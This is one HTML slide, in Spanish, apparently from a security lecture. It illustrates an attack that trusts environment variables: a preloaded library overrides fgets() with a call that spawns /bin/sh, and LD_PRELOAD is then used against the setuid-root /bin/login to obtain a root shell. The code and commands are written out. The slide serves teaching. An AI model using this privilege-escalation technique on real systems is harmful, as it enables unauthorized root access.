<html>
<head>
<title>P&aacute;gina 56</title>
</head>
<body text=#000000 bgcolor=#FFFFFF link=#000080 vlink=#800000 alink=#000080>
<center>
<a href="text0.htm">Primera p&aacute;gina</a> <a href="text54.htm">Regresar</a> <a href="text56.htm">Siguiente</a> <a href="text61.htm">&Uacute;ltima p&aacute;gina</a> <a href="img55.htm">Imagen</a></center><br>
<h1>Ejemplos de ataques</h1><p>
<ul><li><h2>Confiar en las variables de entorno</h2>
<ul><li>Tomamos un programa setuid para root y que use librer&iacute;as din&aacute;micas (por ejempl&oacute; /bin/login, carga din&aacute;micamente la funci&oacute;n fgets para recoger el usuario)
<li>Creamos la librer&iacute;a libme.so en el directorio actual nueva redefini&eacute;ndola:
<ul><li>fgets(char *buf, int n, FILE *fp)
<li>{
<ul><li>execl(&quot;/bin/sh&quot;, &quot;-sh&quot;, 0);
</ul><li>}
</ul></ul><li>Si ejecutamos 
<li>% LD_PRELOAD=.:$LD_PRELOAD
<li>% /bin/login
<li>#
<li>Tendr&iacute;amos un shell con privilegios de su propietario.
</ul></ul><br>
<h3>Notas:</h3>
</body>
</html>